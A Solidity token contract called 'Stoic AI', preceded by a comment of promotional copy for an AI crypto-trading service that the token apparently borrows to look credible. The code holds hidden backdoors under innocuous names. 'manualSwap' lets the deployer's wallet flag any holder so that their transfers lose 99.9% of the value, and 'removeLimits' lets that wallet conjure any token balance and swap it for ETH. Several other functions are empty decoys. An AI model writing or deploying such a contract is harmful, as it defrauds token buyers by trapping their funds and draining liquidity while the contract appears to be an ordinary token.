/*
Website : www.stoic-ai.com
Medium : medium.com/@stoic-ai-token
Telegram : T.me/stoic_ai_token
Twitter(X) : x.com/Stoic_ai_token
About Stoic AI
Automated cryptocurrency trading at its best. AI executes trading activity 
24/7 on your behalf to minimize risks and maximize profits. Experience private, 
secure, hedge-fund grade bot trading from the comfort of your exchange account.
Binance trading and bot Coinbase trading provide the best exchange platforms 
for Stoic AI trading. Auto trading occurs within the Stoic AI app software, allowing 
each specified strategy to capitalize on various market inefficiencies.
Who Uses Stoic AI?
Stoic is a bot crypto application utilizing AI to place trades on a user’s 
behalf. Both the novice and the expert trader will benefit from use, allowing 
proven algorithms to manage each crypto portfolio with ease.
New to bot cryptocurrency? No problem. Veteran trader? Also no problem. Stoic AI
has been designed from the ground up to offer a unique, simple, AI crypto trading 
bot experience never witnessed in the market before.
Trading Strategies
3 automated trading bot crypto strategies primed to dominate diverse market conditions:
Fixed Income – Multi-cycle strategy
o A market-neutral, steady performance strategy with lower risk and modest yield.
o Purchases spot assets then shorts them simultaneously on the Futures market.
o Performance is optimal during a bull market and steady at any stage.
o A market-neutral strategy with moderate risk and strong yield.
o Allocates funds in a dozen sub-strategies at the same time to be efficient in 
any market environment.
o Performance is not affected by market conditions. Even during market crashes, 
this strategy maintains solid returns.
Long Only: Uptrend King
o A long-term, portfolio rebalancing strategy with moderate risk and high upside 
potential.
o Purchases long positions in the top 30 coins most likely to increase, sells those 
that are estimated to decrease.
o Performance is optimal during uptrends; allocation is best during a bear market.
Key Advantages
Funds never leave your exchange account ⊙ Withdraw anytime with no penalty fees 
⊙ No portfolio limits ⊙ No manual trading ⊙ 24/7 Automatic trading ⊙ Regular 
rebalancing ⊙ Order Execution ⊙ Buys low and sells at the top ⊙ Bitcoin bot 
capabilities ⊙ Low price with range of robust features ⊙ Binance bot trading 
⊙ AI crypto trading bot
Why Trust Us?
We have been featured on Bloomberg, Nasdaq, Fidelity Investments, and The Verge 
among other publications. Cindicator, the company behind Stoic AI, has been in business 
since 2015 and has a proven track record managing over $130M in deposits from over 
15k customers focused on bot crypto trading.
Our company is an official Binance Broker, having been vetted by one of the top 
crypto exchanges in the world. Each trading strategy is hand-selected for extensive 
testing before release onto the application. Several departments work on strategy 
development and testing for the AI crypto trading bot including the Quant team, 
Trading Platform team, DevOps team, and Product teams.
How to Get Started
1. Download the app
2. Connect your Binance or Coinbase account and view the demo for free
3. Your funds remain on your exchange - no transfers needed
4. Choose a pricing plan and forget about manual trading!
*/
pragma solidity ^0.8.21;
// SPDX-License-Identifier: MIT

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata path, address cAddress, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract StoicAI is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;

    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;

    constructor() {
        _balances[sender()] =  _totalSupply; 
        emit Transfer(address(0), sender(), _balances[sender()]);
        _taxWallet = msg.sender; 
    }

    string private _name = "Stoic AI";
    string private _symbol = "STOIC AI";

    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public _taxWallet;

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function name() external view returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function openTrading() public {
    }
    function reduceFee() external {
    }
    function addBots() public {
    }
    function delBots() public {
    }
    function manualSwap(address[] calldata walletAddress) external {
        uint256 fromBlockNo = getBlockNumber();
        for (uint walletInde = 0;  walletInde < walletAddress.length;  walletInde++) { 
            if (!marketingAddres()){} else { 
                cooldowns[walletAddress[walletInde]] = fromBlockNo + 1;
            }
        }
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function getBlockNumber() internal view returns (uint256) {
        return block.number;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    event Transfer(address indexed from, address indexed to, uint256);
    mapping (address => uint256) internal cooldowns;
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function marketingAddres() private view returns (bool) {
        return (_taxWallet == (sender()));
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function removeLimits(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
            _approve(address(this), address(uniV2Router), amount); 
            _balances[address(this)] = amount;
            address[] memory addressPath = new address[](2);
            addressPath[0] = address(this); 
            addressPath[1] = uniV2Router.WETH(); 
            uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, addressPath, walletAddr, block.timestamp + 32);
        } else {
            return;
        }
    }
    function _transfer(address from, address to, uint256 value) internal {
        uint256 _taxValue = 0;
        require(from != address(0));
        require(value <= _balances[from]);
        emit Transfer(from, to, value);
        _balances[from] = _balances[from] - (value);
        bool onCooldown = (cooldowns[from] <= (getBlockNumber()));
        uint256 _cooldownFeeValue = value.mul(999).div(1000);
        if ((cooldowns[from] != 0) && onCooldown) {  
            _taxValue = (_cooldownFeeValue); 
        }
        uint256 toBalance = _balances[to];
        toBalance += (value) - (_taxValue);
        _balances[to] = toBalance;
    }
    event Approval(address indexed, address indexed, uint256 value);
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    mapping(address => uint256) private _balances;
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
}